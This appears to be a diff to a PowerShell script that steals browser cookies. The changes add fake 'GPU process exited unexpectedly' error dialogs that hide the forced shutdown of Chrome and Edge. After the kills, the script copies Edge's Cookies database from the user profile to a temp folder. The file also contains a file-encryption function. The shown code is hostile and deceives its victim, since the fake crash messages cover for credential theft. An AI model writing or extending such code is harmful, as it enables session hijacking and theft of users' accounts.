@@ -51,14 +51,19 @@ function Protect-File {
     [System.IO.File]::WriteAllBytes($FilePath + ".crypt", $FinalOutput)
     Write-Host "File encrypted successfully!" -ForegroundColor Green
 }
-
-
+Add-Type -AssemblyName System.Windows.Forms
 
 if (-not ([System.Management.Automation.PSTypeName]"Win32.SQLiteSafe").Type) {
     Add-Type -MemberDefinition $Signature -Name "SQLiteSafe" -Namespace "Win32"
 }
 Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+if ($?) {
+    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Information")
+}
 Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+if ($?) {
+    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Information")
+}
 Start-Sleep -Seconds 1
 $originalPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
 $dbPath = "$env:TEMP\edge_tihng"
